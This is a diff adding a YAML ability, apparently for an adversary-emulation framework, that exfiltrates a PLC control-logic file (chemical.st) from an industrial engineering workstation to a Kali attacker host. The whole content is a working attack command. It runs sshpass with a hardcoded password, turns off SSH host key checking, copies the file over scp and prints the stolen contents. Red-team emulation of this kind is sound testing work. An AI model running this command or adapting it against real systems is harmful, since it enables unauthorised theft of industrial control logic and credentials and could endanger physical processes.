@@ -1,0 +1,21 @@
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000006
+  name: SCP Exfil - Pull chemical.st from EWS to Kali
+  description: |
+    Copies /home/engineer/Desktop/chemical.st from the EWS to /tmp/exfil_chemical.st on the
+    Kali agent host via scp (SSH). Validates artifact availability for follow-on analysis.
+  tactic: collection
+  technique_id: T0893
+  technique_name: Data from Local System
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      sshpass -p 'plc123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      engineer@192.168.95.5:/home/engineer/Desktop/chemical.st /tmp/exfil_chemical.st &&
+      wc -c /tmp/exfil_chemical.st &&
+      head -15 /tmp/exfil_chemical.st &&
+      echo "EXFIL_CHEMICAL_ST_DONE"
+    timeout: 90
